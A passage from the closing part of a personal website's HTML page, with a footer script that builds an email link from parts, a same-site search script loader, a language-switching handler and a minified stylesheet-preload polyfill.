    document.write(starting); document.write(lastname); document.write("." + firstname); document.write("@" + server);if (Boolean(subject)) { document.write("?subject=" + subject + "&body=" + body); }
    document.write(closing); }
  email("<a class='mymail' aria-label='Send me an email' href='mailto:", "gmail.com", "antonios", "tsolis", "", "","' target='_blank'><i class='fa fa-envelope-o' aria-hidden='true'></i></a>");
</script>
</footer>
<script async src="https://alamot.github.io/js/jq-btsp-lunr.min.js" onload="init()"></script>
<script>
short_months = {
  "en": ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
  "el": ["Ιαν", "Φεβ", "Μαρ", "Απρ", "Μαϊ", "Ιουν", "Ιουλ", "Αυγ", "Σεπ", "Οκτ", "Νοε", "Δεκ"]
}
function init () {
$(document).ready(function(){
  $("#lang-selector>ul>li>a").click(function(){
    var langid = this.id;
    var selText = this.text;
    document.getElementById('mainbody').setAttribute('class', langid);
    document.getElementById('mainbody').setAttribute('lang', langid);
    localStorage.setItem('language', langid);
    $("#lang-selector>a").html(selText+' <i class="fa fa-caret-down" aria-hidden="true"></i>');
  });

  $("#TableOfContents a, #content-selector a").on('click', function(e) {
    var hash = this.hash;
    if (hash) {
      e.preventDefault();
      $('html, body').animate({scrollTop: $(hash).offset().top}, 1300, function(){
        window.location.hash = hash;
      });
    }  
  });

  
});}
</script>
<script>
(function(a){var b=function(b,h,n){function d(a){if(f.body)return a();setTimeout(function(){d(a)})}function k(){c.addEventListener&&c.removeEventListener("load",k);c.media=n||"all"}var f=a.document,c=f.createElement("link"),g;if(h)g=h;else{var e=(f.body||f.getElementsByTagName("head")[0]).childNodes;g=e[e.length-1]}var m=f.styleSheets;c.rel="stylesheet";c.href=b;c.media="only x";d(function(){g.parentNode.insertBefore(c,h?g:g.nextSibling)});var l=function(a){for(var b=c.href,d=m.length;d--;)if(m[d].href===
b)return a();setTimeout(function(){l(a)})};c.addEventListener&&c.addEventListener("load",k);c.onloadcssdefined=l;l(k);return c};"undefined"!==typeof exports?exports.loadCSS=b:a.loadCSS=b})("undefined"!==typeof global?global:this);
(function(a){if(a.loadCSS){var b=loadCSS.relpreload={};b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(h){return!1}};b.poly=function(){for(var b=a.document.getElementsByTagName("link"),e=0;e<b.length;e++){var d=b[e];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d),d.rel=null)}};if(!b.support()){b.poly();var e=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){a.clearInterval(e)});a.attachEvent&&
a.attachEvent("onload",function(){a.clearInterval(e)})}}})(this);
</script>
</body>
</html>

